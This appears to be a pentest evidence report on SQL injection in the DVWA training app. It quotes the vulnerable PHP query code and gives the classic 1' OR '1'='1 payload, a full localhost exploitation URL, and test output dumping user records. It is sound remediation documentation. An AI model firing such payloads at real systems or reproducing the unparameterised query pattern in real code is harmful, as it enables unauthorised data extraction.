# Evidence 02 - SQL Injection (Before Remediation)

## 1. Vulnerability Overview
* **Vulnerable Module**: DVWA SQL Injection
* **File Location**: `app/vulnerabilities/sqli/source/low.php`
* **Vulnerability Class**: CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) / OWASP A03:2021 - Injection
* **Default Security Level**: `low`

## 2. Vulnerable Code Analysis
In `app/vulnerabilities/sqli/source/low.php`:
```php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            // Check database
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( ... );
```
The parameter `$id` is accepted directly from untrusted user input (`$_REQUEST['id']`) and concatenated directly into the SQL query string using string interpolation without data type validation, escaping, or prepared statements.

## 3. Pre-Fix Attack Procedure & Live Payload
* **Endpoint URL**: `http://127.0.0.1:4280/vulnerabilities/sqli/`
* **HTTP Method**: `GET`
* **Test Payload**:
  ```text
  1' OR '1'='1
  ```
* **Full Exploitation URL**:
  ```text
  http://127.0.0.1:4280/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
  ```

## 4. Expected & Actual Vulnerable Behavior
When submitted, the SQL query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
Because `'1'='1'` evaluates to true for every record in the table, the database returns all user records instead of a single ID.

### Live Terminal Proof (Automated Test Execution)
```text
[*] Request URI: http://127.0.0.1:4280/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit
[!] EXPLOIT SUCCESS (VULNERABLE): Multiple records dumped via SQLi bypass!
     ID: 1' OR '1'='1 First name: admin Surname: admin 
     ID: 1' OR '1'='1 First name: Gordon Surname: Brown 
     ID: 1' OR '1'='1 First name: Hack Surname: Me 
```

## 5. Security Impact
- **Confidentiality Breach**: Full exfiltration of user accounts, hashed credentials, and metadata.
- **Integrity Risk**: Possibility of UNION-based extraction and out-of-band updates.
- **Pre-Mitigation Risk Rating**: **Likelihood: 3 (High)** × **Impact: 3 (High)** = **9 (High / Critical)**.

## 6. Manual Screenshot Checklist
Capture and place the following screenshots in this directory:
- `sqli-before-browser.png`: Browser view of DVWA SQL Injection page showing payload `1' OR '1'='1` in the User ID box and multiple user records (`admin`, `Gordon`, `Hack`) returned.
- `sqli-before-burp-or-terminal.png`: HTTP request/response in Burp Suite or PowerShell showing the dumped database records.
